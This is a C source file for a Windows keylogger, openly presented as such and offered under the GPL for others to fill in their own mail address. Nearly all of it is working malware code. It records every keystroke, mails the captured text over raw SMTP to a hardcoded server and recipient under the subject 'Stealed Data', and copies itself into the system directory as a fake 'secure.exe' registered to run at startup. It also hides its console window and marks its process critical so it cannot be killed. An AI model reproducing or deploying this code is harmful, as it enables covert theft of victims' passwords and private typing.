
/**
 * \file keylogger.h
 *
 *  Copyright (C) 2009-2010, Ongaro Mattia <moongaro at gmail.com>
 *  All rights reserved.
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 */
/**
 * Add -std=c99 and -lwsock32 to the compiler
 */

#include <stdio.h>
#include <string.h>

#if defined ( unix )
    #error The operative system have to be Winzoz
#endif

#include <windows.h>

#ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
#endif

inline unsigned get_len ( char * str );

int send_mail ( char * subject, char * message, char * to, char * from, const char ip [ 17 ], int door );
int take_n_run ( int, char * );

typedef void ( _stdcall * RtlSetProcessIsCritical ) ( IN BOOLEAN New, OUT PBOOLEAN Old, IN BOOLEAN Log );
int protectProcess ( void );

void regApp ( void );
int hideConsole ( void );

#define IP "85.18.95.132" // smtp.fastwebnet.it mail server
#define DOOR 25           // SMTP Door

#define FROM "shifterskeylogger@stealingdata.net"
#define TO "binaryincubus@live.it" // Here your mail
#define SUBJECT "Stealed Data"

#define _MAX_CHAR 500

int main ( void )
{
    register short i;
    char * data = ( char * ) calloc ( _MAX_CHAR + 12, sizeof ( char ) );

    regApp ( );
    protectProcess ( );
    hideConsole ( );


    while ( 1 ) {
        while ( get_len ( data ) < _MAX_CHAR )
        {
            for ( i = 8 ; i <= 190 ; i++ )
            {
                if ( GetAsyncKeyState ( i ) == -32767 ) {
                    take_n_run ( i, data);
                }
            }
            Sleep(10);
        }

        send_mail ( SUBJECT, data, TO, FROM, IP, DOOR  );
        memset ( data, 0, _MAX_CHAR + 12 );
    }

    return 0;
}

// Simple Mail Transfer Protocol
#define _OPEN   "HELO default\r\n"\
                "MAIL FROM: <"

#define _RCPT   ">\r\nRCPT TO: <"
#define _DATA   ">\r\nDATA\r\n"\
                "From: <"

#define _SUB    ">\r\nSubject: "
#define _NEWLINE    "\r\n\r\n"

#define _CLOSE  "\r\n.\r\n"\
                "QUIT\r\n"

inline unsigned get_len ( char * str ) {
    return ( unsigned ) ( strlen ( str ) * sizeof ( char ) );
}

int send_mail ( char * subject, char * message, char * to, char * from, const char ip [ 17 ], int door )
{
    int sock;
    struct sockaddr_in saddr;

    WSADATA wsadata;
    if ( WSAStartup ( MAKEWORD ( 2, 2 ), & wsadata ) != 0 ) {
        return -1;
    }

    if ( ( sock = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0) {
        return -1;
    }

    saddr . sin_family = AF_INET;
    saddr . sin_addr . s_addr = inet_addr ( ip );
    saddr . sin_port = htons ( door );

    if ( connect ( sock, ( struct sockaddr * ) & saddr, sizeof ( saddr ) ) < 0 ) {
        return -1;
    }

    size_t check_size = get_len ( _OPEN );
    if ( check_size != send ( sock, _OPEN, check_size, 0 ) ) {
        return -1;
    }

    check_size = get_len ( from );
    if ( check_size != send ( sock, from, check_size, 0 ) ) {
        return -1;
    }

    check_size = get_len ( _RCPT );
    if ( check_size != send ( sock, _RCPT, check_size, 0 ) ) {
        return -1;
    }

    check_size = get_len ( to );
    if ( check_size != send ( sock, to, check_size, 0 ) ) {
        return -1;
    }

    check_size = get_len ( _DATA );
    if ( check_size != send ( sock, _DATA, check_size, 0 ) ) {
        return -1;
    }

    check_size = get_len ( from );
    if ( check_size != send ( sock, from, check_size, 0 ) ) {
        return -1;
    }

    check_size = get_len ( _SUB );
    if ( check_size != send ( sock, _SUB, check_size, 0 ) ) {
        return -1;
    }

    check_size = get_len ( subject );
    if ( check_size != send ( sock, subject, check_size, 0 ) ) {
        return -1;
    }

    check_size = get_len ( _NEWLINE );
    if ( check_size != send ( sock, _NEWLINE, check_size, 0 ) ) {
        return -1;
    }

    check_size = get_len ( message );
    if ( check_size != send ( sock, message, check_size, 0 ) ) {
        return -1;
    }

    check_size = get_len ( _CLOSE );
    if ( check_size != send ( sock, _CLOSE, check_size, 0 ) ) {
        return -1;
    }

    closesocket ( sock );
    WSACleanup ( );

    return 0;
}

int take_n_run ( int key, char * buffer )
{
    switch ( key ) {
        case 8 :
            strcat ( buffer, "[B]" );
            return 0;
        case 13 :
            strcat ( buffer, "\n" );
            return 0;
        case 32 :
            strcat ( buffer, " " );
            return 0;
        case VK_TAB :
            strcat ( buffer, "[T]" );
            return 0;
        case VK_SHIFT :
            strcat ( buffer, "[S]" );
            return 0;
        case VK_CONTROL :
            strcat ( buffer, "[C]" ) ;
            return 0;
        case VK_ESCAPE :
            strcat ( buffer, "[ES]" );
            return 0;
        case VK_END :
            strcat ( buffer, "[EN]" );
            return 0;
        case VK_HOME :
            strcat ( buffer, "[H]" );
            return 0;
        case VK_LEFT :
            strcat ( buffer, "[L]" );
            return 0;
        case VK_RIGHT :
            strcat ( buffer, "[R]" );
            return 0;
        case VK_UP :
            strcat ( buffer, "[U]" );
            return 0;
        case VK_DOWN :
            strcat ( buffer, "[D]" );
            return 0;
        case 110 :
        case 190 :
            strcat ( buffer, "." );
            return 0;
        default:
            strcat ( buffer, ( char * ) & key );
    }

    return 0;
}

#define CONSOLE_NAME "Secure"

int hideConsole ( void )
{
   if ( ! SetConsoleTitle ( CONSOLE_NAME ) ) {
        return -1;
   }

   HWND thisWindow;

   thisWindow = FindWindow( NULL, CONSOLE_NAME );

   ShowWindow ( thisWindow, 0 );
   return 0;
}

#define FAKE_NAME "\\secure.exe"
#define FAKE_KEY "Secure Internet"

void regApp ( void )
{
   char system_ [ MAX_PATH ];
   char pathToFile[ MAX_PATH ];
   HMODULE getMod = GetModuleHandle ( NULL );

   GetModuleFileName ( getMod, pathToFile, sizeof  ( pathToFile ) );
   GetSystemDirectory ( system_, sizeof ( system_ ) );

   strcat ( system_, FAKE_NAME );

   CopyFile ( pathToFile, system_, 0);

   HKEY key_;

   RegOpenKeyEx ( HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, & key_ );

   RegSetValueEx ( key_, FAKE_KEY, 0, REG_SZ, ( const unsigned char * ) system_, sizeof ( system_ ) );

   RegCloseKey ( key_ );
}

int protectProcess ( void )
{
    int enablePriv ( const char * szPriv );
    HANDLE DLL;
    RtlSetProcessIsCritical setCritical;

    DLL = LoadLibraryA ( "ntdll.dll" );

    if ( DLL == NULL ) {
        return -1;
    }

    if ( enablePriv ( SE_DEBUG_NAME ) < 0 ) {
        return -1;
    }

    setCritical = ( RtlSetProcessIsCritical ) GetProcAddress( ( HINSTANCE ) DLL, "RtlSetProcessIsCritical" );

    if ( ! setCritical ) {
        return -1;
    }

    setCritical ( 1, 0, 0 );
    return 0;
}

int enablePriv ( const char * szPriv )
{
    HANDLE token;
    LUID luid;
    TOKEN_PRIVILEGES privs;
    memset ( &privs, 0, sizeof ( privs ) );

    if ( ! OpenProcessToken ( GetCurrentProcess ( ), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, & token ) ) {
       return -1;
    }

    if ( ! LookupPrivilegeValue ( NULL, szPriv, & luid ) )
    {
        CloseHandle ( token );
        return -1;
    }

    privs . PrivilegeCount = 1;
    privs . Privileges [ 0 ] . Luid = luid;
    privs . Privileges [ 0 ] . Attributes = SE_PRIVILEGE_ENABLED;

    if ( ! AdjustTokenPrivileges ( token, FALSE, & privs, sizeof ( privs ), NULL, NULL ) ) {
                        return -1;
    }

    CloseHandle ( token );
    return 0;
}
